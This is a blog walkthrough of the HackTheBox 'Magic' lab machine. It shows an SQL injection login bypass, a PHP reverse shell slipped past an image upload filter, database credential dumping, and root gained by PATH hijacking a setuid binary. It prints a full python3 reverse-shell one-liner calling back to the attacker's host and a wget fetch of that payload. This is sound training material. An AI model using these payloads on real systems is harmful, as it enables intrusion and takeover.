<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Acruxlare | HackTheBox - Magic</title>
  <meta name="description" content="Walkthrough of Magic box on Hackthebox.">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="HackTheBox - Magic">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://fumenoid.github.io/posts/hackthebox-magic">
  <meta property="og:description" content="Walkthrough of Magic box on Hackthebox.">
  <meta property="og:site_name" content="Acruxlare">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="https://fumenoid.github.io/posts/hackthebox-magic">
  <meta name="twitter:title" content="HackTheBox - Magic">
  <meta name="twitter:description" content="Walkthrough of Magic box on Hackthebox.">

  
    
      <meta property="og:image" content="https://fumenoid.github.io/assets/documentation/magicthumb-2954c07e03d626591cb3a23dd69243f082bdac60bfa079e81d7e07b378d5ecde.jpg">
      <meta property="og:image:height" content="286">
      <meta property="og:image:width" content="507">
      <meta name="twitter:image" content="https://fumenoid.github.io/assets/documentation/magicthumb-2954c07e03d626591cb3a23dd69243f082bdac60bfa079e81d7e07b378d5ecde.jpg">
      <meta name="twitter:card" content="summary_large_image">
    
  

  <link href="https://fumenoid.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Acruxlare Last 10 blog posts" />

  

  

    
      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-f46876861f8611b1be1e40dbc82954f6ce18e041809dce43ba85794a93ef72e2.ico">
      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
    

  

</head>

<body>
  <main>
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav scrollappear">
  <a href="/" class="header-logo" title="Acruxlare">Acruxlare</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
</svg>

        </a>
      </li>
    
    
      <li>
        <a href="https://twitter.com/fumenoid" rel="noreferrer noopener" target="_blank" title="Twitter">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
</svg>

        </a>
      </li>
    
    
    
    
      <li>
        <a href="https://github.com/fumenoid" rel="noreferrer noopener" target="_blank" title="GitHub">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
      <li>
        <a href="mailto:fumenoid@gmail.com" title="Email">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
</svg>

        </a>
      </li>
    
    
    
  </ul>
</nav>


  <ul class="header-tags scrollappear">
    
    
      
        <li><a href="/tag/forensics">Forensics</a></li>
    
      
        <li><a href="/tag/hackthebox">Hackthebox</a></li>
    
      
        <li><a href="/tag/programming">Programming</a></li>
    
      
        <li><a href="/tag/sorcery">Sorcery</a></li>
    
      
        <li><a href="/tag/tryhackme">Tryhackme</a></li>
    
  </ul>


        <article class="article scrollappear">
          <header class="article-header">
            <h1>HackTheBox - Magic</h1>
            <p>Walkthrough of Magic box on Hackthebox.</p>
            <div class="article-list-footer">
  <span class="article-list-date">
    August 22, 2020
  </span>
  <span class="article-list-divider">-</span>
  <span class="article-list-minutes">
    
    
      9 minute read
    
  </span>
  <span class="article-list-divider">-</span>
  <div class="article-list-tags">
    
      
      <a href="/tag/hackthebox" title="See all posts with tag 'hackthebox'">hackthebox</a>
    
  </div>
</div>
          </header>

          <div class="article-content">
            <p><a href="/assets/documentation/magic-b0f732e51642a7bb8bd441491a1d6084056838a43d538169fdd8f8b44ab58b25.webp">
  <img src="/assets/documentation/magic-b0f732e51642a7bb8bd441491a1d6084056838a43d538169fdd8f8b44ab58b25.webp" alt="HTB Magic" class="zooming" data-rjs="/assets/documentation/magic-b0f732e51642a7bb8bd441491a1d6084056838a43d538169fdd8f8b44ab58b25.webp" data-zooming-width="1298" data-zooming-height="724" />
</a></p>

<h2 id="htb---magic">HTB - MAGIC</h2>

<p>IP - 10.10.10.185</p>

<h3 id="overview">Overview</h3>

<p>This box was a medium level linux box on HTB created by <a href="https://www.hackthebox.eu/home/users/profile/31190">TRX</a>, it started with a sqli in the login page which redirected us to an upload page. We use that upload page to upload a php reverse shell to the server which was a liltle pain as it was checking the file headers and extensions of the files getting uploaded. After getting a revshell we start enumeration. While enumerating the web directory we get the database creds in a file <code class="highlighter-rouge">db.php5</code> but <code class="highlighter-rouge">mysql</code> wasn’t installed on the box so we dumped the db using <code class="highlighter-rouge">mysqldump</code> and finally got user. For root we ran linpeas on server and it stated we can run and read a file <code class="highlighter-rouge">/bin/sysinfo</code> on the box and doing a bit on enum on that elf executable we figure out, it is calling some executables like <code class="highlighter-rouge">fdisk</code> and running the with escalated perms so we ended up creating a python rev shell and name it <code class="highlighter-rouge">fdisk</code> then we change the <code class="highlighter-rouge">PATH</code> variable and then run <code class="highlighter-rouge">sysinfo</code> executable to get root access on the box.</p>

<h3 id="enumeration">Enumeration</h3>

<p>As always let’s start off with nmap script nmap -sC for default scripts <del>Alright, if it isn’t obvious yet I am a IPPSEC fanboi.</del> Aight, firing up nmap to scan all open ports on the box.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/results 10.10.10.185</code></pre></figure>

<p>And here is our nmap result</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Nmap scan report <span class="k">for </span>10.10.10.185
Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span class="o">(</span>RSA<span class="o">)</span>
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Magic Portfolio
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Wed May 13 00:46:13 2020 -- 1 IP address (1 host up) scanned in 46.94 seconds</span></code></pre></figure>

<p>Open services SSH on port 22 and webserver on port 80. As there aren’t many attacks possible on ssh so I am gonna shift my focus on the web server.</p>

<h4 id="enumerating-the-web-server">Enumerating the web server</h4>

<p>The site looks like a web service where authorized user can upload images.</p>

<p><a href="/assets/documentation/magichome-7f728dfc31f509c85985c00ec6cdc09b2bcbd8ea059a9b25ac33b4417b26f3bc.webp">
  <img src="/assets/documentation/magichome-7f728dfc31f509c85985c00ec6cdc09b2bcbd8ea059a9b25ac33b4417b26f3bc.webp" alt="HTB Magic" class="zooming" data-rjs="/assets/documentation/magichome-7f728dfc31f509c85985c00ec6cdc09b2bcbd8ea059a9b25ac33b4417b26f3bc.webp" data-zooming-width="1365" data-zooming-height="713" />
</a></p>

<p>Checking the info that <a href="https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/">wappalyzer</a> extracted for us from the headers. It seems like the website has php on backend and webserver is apache, nmap also showed us that the webserver is apache.</p>

<p>Alright let’s run something on backend and start exploring the website, because we always want to keep some enumeration running <del>Told ya already, I am a ippsec fanboi.</del> So firing up the gobuster scan to find hidden directories, and i am also looking txt and php files(incase we find some notes or some hidden webpage).</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Magic]
└──╼ <span class="nv">$gobuster</span> <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.185 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> txt,php <span class="nt">-o</span> gobuster_result <span class="nt">-t</span> 120</code></pre></figure>

<h4 id="foothold">Foothold</h4>

<p><a href="/assets/documentation/magiclogin-24660fdec843d08eb6b9328f583fd71ec94b865c66d759fd2bdb0e3876c48c18.webp">
  <img src="/assets/documentation/magiclogin-24660fdec843d08eb6b9328f583fd71ec94b865c66d759fd2bdb0e3876c48c18.webp" alt="HTB Magic" class="zooming" data-rjs="/assets/documentation/magiclogin-24660fdec843d08eb6b9328f583fd71ec94b865c66d759fd2bdb0e3876c48c18.webp" data-zooming-width="1365" data-zooming-height="715" />
</a></p>

<p>Alright coming back to the webpage we can see the text on lower left corner <code class="highlighter-rouge">login to upload images</code>, I am guessing we can upload a php reverse shell on the box after logining in. Can’t find any creds or usernames on the website so i am trying basic sqli payloads. Alright it’s sqli injectable passing <code class="highlighter-rouge">' or 1=1 --</code> to both username and password field, And we get a login bypass which redirected up to the <code class="highlighter-rouge">uploads.php</code> page.</p>

<p><a href="/assets/documentation/magicupload-a974fb2df99ed9f55b26377c1e2d3fce1885154f91805a000b9438b5752b7aa0.webp">
  <img src="/assets/documentation/magicupload-a974fb2df99ed9f55b26377c1e2d3fce1885154f91805a000b9438b5752b7aa0.webp" alt="HTB Magic" class="zooming" data-rjs="/assets/documentation/magicupload-a974fb2df99ed9f55b26377c1e2d3fce1885154f91805a000b9438b5752b7aa0.webp" data-zooming-width="1365" data-zooming-height="714" />
</a></p>

<p>Uploading a simple image to test the upload feature. <em>Uploading the same image i used for this blog’s thumbnail.</em></p>

<p><a href="/assets/documentation/magicsimpleupload-226d3996639c81b74d36a5afbec8fa2339d348c589a5350a2c2729ad7efc3ad3.webp">
  <img src="/assets/documentation/magicsimpleupload-226d3996639c81b74d36a5afbec8fa2339d348c589a5350a2c2729ad7efc3ad3.webp" alt="HTB Magic" class="zooming" data-rjs="/assets/documentation/magicsimpleupload-226d3996639c81b74d36a5afbec8fa2339d348c589a5350a2c2729ad7efc3ad3.webp" data-zooming-width="1365" data-zooming-height="714" />
</a></p>

<p>We can see it get uploaded to the webpage on a path <code class="highlighter-rouge">http://10.10.10.185/images/uploads/magicthumb.jpg</code>, That is <code class="highlighter-rouge">http://10.10.10.185/images/uploads/</code> + <code class="highlighter-rouge">nameofthefileweuploaded.ext</code>. Alright, time to try and upload a php reverse shell, i am using the one by pentest monkey, you can get it from <a href="https://github.com/pentestmonkey/php-reverse-shell">here</a>.</p>

<p><a href="/assets/documentation/magicuploadfailone-d28722e14f50c615df7ebef7280d3565b84f3efb6f8b6bbd54d45b882d0f6bba.webp">
  <img src="/assets/documentation/magicuploadfailone-d28722e14f50c615df7ebef7280d3565b84f3efb6f8b6bbd54d45b882d0f6bba.webp" alt="HTB Magic" class="zooming" data-rjs="/assets/documentation/magicuploadfailone-d28722e14f50c615df7ebef7280d3565b84f3efb6f8b6bbd54d45b882d0f6bba.webp" data-zooming-width="1365" data-zooming-height="715" />
</a></p>

<p>Alright it seems like it is doing a check for png,jpeg… images. let’s try to fool the server by adding <code class="highlighter-rouge">ÿØÿÛ</code> as the first line of the shell, here we are trying to manipulate the file header so server accept it as image.</p>

<p><a href="/assets/documentation/magicuploadfailone-d28722e14f50c615df7ebef7280d3565b84f3efb6f8b6bbd54d45b882d0f6bba.webp">
  <img src="/assets/documentation/magicuploadfailone-d28722e14f50c615df7ebef7280d3565b84f3efb6f8b6bbd54d45b882d0f6bba.webp" alt="HTB Magic" class="zooming" data-rjs="/assets/documentation/magicuploadfailone-d28722e14f50c615df7ebef7280d3565b84f3efb6f8b6bbd54d45b882d0f6bba.webp" data-zooming-width="1365" data-zooming-height="715" />
</a></p>

<p>we still get the same error, renaming the file from <code class="highlighter-rouge">shell.php</code> to <code class="highlighter-rouge">shell.php.jpeg</code> and uploading it to the server.</p>

<p><a href="/assets/documentation/magicuploadworked-144e4c699ee6b4c46355a9758d35ba283efe3e8dfc5d6c9f9eb6b784ccffc9cb.webp">
  <img src="/assets/documentation/magicuploadworked-144e4c699ee6b4c46355a9758d35ba283efe3e8dfc5d6c9f9eb6b784ccffc9cb.webp" alt="HTB Magic" class="zooming" data-rjs="/assets/documentation/magicuploadworked-144e4c699ee6b4c46355a9758d35ba283efe3e8dfc5d6c9f9eb6b784ccffc9cb.webp" data-zooming-width="1365" data-zooming-height="714" />
</a></p>

<p>Alright.. Opening up a netcat listener on our local machine <code class="highlighter-rouge">rlwrap nc -lvnp 9889</code>and navigating to <code class="highlighter-rouge">http://10.10.10.185/images/uploads/shell.php.jpeg</code> and the page starts endless loading, which is good sign, looking at our nc listner and looks like we got a shell on the server. <del>Trust me I wasn’t trying to sound like Ippsec.</del></p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Magic]
└──╼ <span class="nv">$rlwrap</span> nc <span class="nt">-lvnp</span> 9889
listening on <span class="o">[</span>any] 9889 ...
connect to <span class="o">[</span>10.10.14.169] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185] 34046
Linux ubuntu 5.3.0-42-generic <span class="c">#34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
 07:39:37 up 1 day,  9:03,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: cant access <span class="nb">tty</span><span class="p">;</span> job control turned off
<span class="nv">$ </span><span class="nb">whoami
</span>www-data
<span class="nv">$ </span></code></pre></figure>

<h3 id="getting-user">Getting User</h3>

<p>Spawing a tty shell, I like to work with a tty shell so <a href="https://netsec.ws/?p=337">here</a> is a cheatlist you guys can refer to get a tty shell.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/sh")'</span>
/bin/sh: 2: python: not found
<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/sh")'</span>
<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nv">$ </span><span class="nb">ls
ls
</span>bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib	     media	 proc  sbin  swapfile  usr  vmlinuz.old
<span class="nv">$ </span></code></pre></figure>

<p>First thing i usually do after getting a tty shell is running <code class="highlighter-rouge">linpeas.sh</code>, but wasn’t able to anything intresting which <code class="highlighter-rouge">www-data</code> can use to get a privesc to user. So on enumerating the <code class="highlighter-rouge">/var/www/Magic</code> folder on the webserver we find a file <code class="highlighter-rouge">db.php5</code> which had the mysql database creds of user <code class="highlighter-rouge">theseus</code>.</p>

<figure class="highlight"><pre><code class="language-php5" data-lang="php5">    <span class="k">private</span> <span class="k">static</span> <span class="nv">$dbName</span> <span class="o">=</span> <span class="s1">'Magic'</span> <span class="p">;</span>
    <span class="k">private</span> <span class="k">static</span> <span class="nv">$dbHost</span> <span class="o">=</span> <span class="s1">'localhost'</span> <span class="p">;</span>
    <span class="k">private</span> <span class="k">static</span> <span class="nv">$dbUsername</span> <span class="o">=</span> <span class="s1">'theseus'</span><span class="p">;</span>
    <span class="k">private</span> <span class="k">static</span> <span class="nv">$dbUserPassword</span> <span class="o">=</span> <span class="s1">'iamkingtheseus'</span><span class="p">;</span></code></pre></figure>

<p>I tried to use <code class="highlighter-rouge">mysql</code> and funny, it wasn’t installed on the box, i quickly googled about ways to dump mysql database and got to know about a tool <code class="highlighter-rouge">mysqldump</code>(funfact it was on the server).</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">mysqldump Magic <span class="nt">-utheseus</span> <span class="nt">-piamkingtheseus</span>
...
LOCK TABLES <span class="sb">`</span>login<span class="sb">`</span> WRITE<span class="p">;</span>
/<span class="k">*</span><span class="o">!</span>40000 ALTER TABLE <span class="sb">`</span>login<span class="sb">`</span> DISABLE KEYS <span class="k">*</span>/<span class="p">;</span>
INSERT INTO <span class="sb">`</span>login<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">'admin'</span>,<span class="s1">'Th3s3usW4sK1ng'</span><span class="o">)</span><span class="p">;</span>
/<span class="k">*</span><span class="o">!</span>40000 ALTER TABLE <span class="sb">`</span>login<span class="sb">`</span> ENABLE KEYS <span class="k">*</span>/<span class="p">;</span>
UNLOCK TABLES<span class="p">;</span>
/<span class="k">*</span><span class="o">!</span>40103 SET <span class="nv">TIME_ZONE</span><span class="o">=</span>@OLD_TIME_ZONE <span class="k">*</span>/<span class="p">;</span>
...</code></pre></figure>

<p><code class="highlighter-rouge">...</code> represents random(not usefull for us) content, alright so we got another password. So now we have one username <code class="highlighter-rouge">theseus</code>(a user on box) and two passwords <code class="highlighter-rouge">iamkindtheseus</code> and <code class="highlighter-rouge">Th3s3usW4sK1ng</code>.
su theseus tried both passwords and the correct creds were <code class="highlighter-rouge">theseus:Th3s3usW4sK1ng</code>.</p>

<p>Alright we got the user on box</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">theseus@ubuntu:~<span class="nv">$ </span><span class="nb">cat </span>user.txt | <span class="nb">wc</span> <span class="nt">-c</span>
<span class="nb">cat </span>user.txt | <span class="nb">wc</span> <span class="nt">-c</span>
33
theseus@ubuntu:~<span class="err">$</span></code></pre></figure>

<h3 id="rooting-the-box">Rooting the box</h3>

<p>Running <code class="highlighter-rouge">linpeas.sh</code> on the server, if you don’t know about linpeas you can get it from their github repo. Basically it is a bash script that finds some privilage escalation vectors for us by performing basic recon. So on running we find this.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+] Readable files belonging to root and readable by me but not world readable
<span class="nt">-rwsr-x---</span> 1 root <span class="nb">users </span>22040 Oct 21  2019 /bin/sysinfo</code></pre></figure>

<p>Intresting, on running file command we find that it is a elf executable theseus@ubuntu:~$ file /bin/sysinfo</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">file /bin/sysinfo
/bin/sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/l, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped</code></pre></figure>

<p>Executed the binary to see what it is actually doing and seems like it is trying running some system checks, but to me it seems like it is running some system commands to get the result.
Did a strings command to know more about the executable.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">...
popen<span class="o">()</span> failed!
<span class="o">====================</span>Hardware <span class="nv">Info</span><span class="o">====================</span>
lshw <span class="nt">-short</span>
<span class="o">====================</span>Disk <span class="nv">Info</span><span class="o">====================</span>
fdisk <span class="nt">-l</span>
<span class="o">====================</span>CPU <span class="nv">Info</span><span class="o">====================</span>
<span class="nb">cat</span> /proc/cpuinfo
<span class="o">====================</span>MEM <span class="nv">Usage</span><span class="o">=====================</span>
free <span class="nt">-h</span>
<span class="p">;</span><span class="k">*</span>3<span class="s2">$"
...</span></code></pre></figure>

<p>So seems like the executable is using commands like <code class="highlighter-rouge">lshw</code> and <code class="highlighter-rouge">fdisk</code>, I am pretty confident that fdisk requires sudo perms to run.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">theseus@ubuntu:~<span class="nv">$ </span>fdisk <span class="nt">-l</span>
fdisk <span class="nt">-l</span>
fdisk: cannot open /dev/loop0: Permission denied
fdisk: cannot open /dev/loop1: Permission denied
fdisk: cannot open /dev/loop2: Permission denied
fdisk: cannot open /dev/loop3: Permission denied
fdisk: cannot open /dev/loop4: Permission denied
fdisk: cannot open /dev/loop5: Permission denied
fdisk: cannot open /dev/loop6: Permission denied
fdisk: cannot open /dev/loop7: Permission denied
fdisk: cannot open /dev/sr0: Permission denied
fdisk: cannot open /dev/fd0: Permission denied
fdisk: cannot open /dev/sda: Permission denied
fdisk: cannot open /dev/loop8: Permission denied
fdisk: cannot open /dev/loop9: Permission denied
fdisk: cannot open /dev/loop10: Permission denied
fdisk: cannot open /dev/loop11: Permission denied</code></pre></figure>

<p>Tried it on box and yes, fdisk requires sudo permission to run this implies the script is running lshw and fdisk as sudo/privilaged permissions. Hoping the executable is using relative paths we me move to the <code class="highlighter-rouge">/tmp</code> directory and create a python3 reverse shell and name it <code class="highlighter-rouge">fdisk</code>.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">theseus@ubuntu:/<span class="nv">$ </span><span class="nb">cd</span> /tmp
<span class="nb">cd</span> /tmp
<span class="c"># I tried...</span>
theseus@ubuntu:/tmp<span class="nv">$ </span><span class="nb">echo </span>python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.169",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span> <span class="o">&gt;</span> fdisk
<span class="c"># but this didn't worked for me due ",' signs so i created it on my local machine using vim and then uploaded it on the box by creating a python3 http server and `wget`-ing the fdisk file.</span>
theseus@ubuntu:/tmp<span class="nv">$ </span>wget http://10.10.14.169:8000/fdisk
wget http://10.10.14.169:8000/fdisk
<span class="nt">--2020-07-19</span> 08:45:42--  http://10.10.14.169:8000/fdisk
Connecting to 10.10.14.169:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 230 <span class="o">[</span>application/octet-stream]
Saving to: ‘fdisk2’

fdisk               <span class="o">[===================&gt;]</span>     230  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      

2020-07-19 08:45:43 <span class="o">(</span>44.4 MB/s<span class="o">)</span> - ‘fdisk’ saved <span class="o">[</span>230/230]
theseus@ubuntu:/tmp<span class="err">$</span>
theseus@ubuntu:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x fdisk</code></pre></figure>

<p>Next we need to export PATH variable as /tmp:(old PATH variable) so that when <code class="highlighter-rouge">sysinfo</code> executable gets executed it searches for <code class="highlighter-rouge">fdisk</code> in tmp directory first then in rest of the path.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span></code></pre></figure>

<p>Starting the nmap listener on local machine <code class="highlighter-rouge">nc -lvnp 9999</code>. And then running <code class="highlighter-rouge">sysinfo</code> executable on box.
Yeet we got a reverse shell with root.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Magic]
└──╼ <span class="nv">$rlwrap</span> nc <span class="nt">-lvnp</span> 9999
listening on <span class="o">[</span>any] 9999 ...
connect to <span class="o">[</span>10.10.14.169] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185] 40024
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt | wc -c</span>
33</code></pre></figure>

<h6 id="hope-you-learned-something-new-if-you-face-any-issues--have-any-query-feel-free-to-contact-me-on-social-media">Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.</h6>

          </div>
          <div class="article-share">
            
            
            <a href="https://twitter.com/intent/tweet?url=https://fumenoid.github.io/posts/hackthebox-magic&via=fumenoid&text=HackTheBox - Magic : Walkthrough of Magic box on Hackthebox." title="Share on Twitter" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
            </a>
            <a href="https://www.facebook.com/sharer/sharer.php?u=https://fumenoid.github.io/posts/hackthebox-magic" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
            </a>
          </div>

          
        </article>
        <footer class="footer scrollappear">
  <p>
    Happy Hacking :D
  </p>
</footer>

      </div>
    </div>
  </main>
  
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-172959519-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'UA-172959519-1');
  </script>


<script src="/assets/vendor-130c9c254effc51f3283620bc635851da7b99c20901216948f11ba72ee13317f.js" type="text/javascript"></script>


  <script src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js" type="text/javascript"></script>



  <script src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js" type="text/javascript"></script>


<script src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js" type="text/javascript"></script>


</body>
</html>
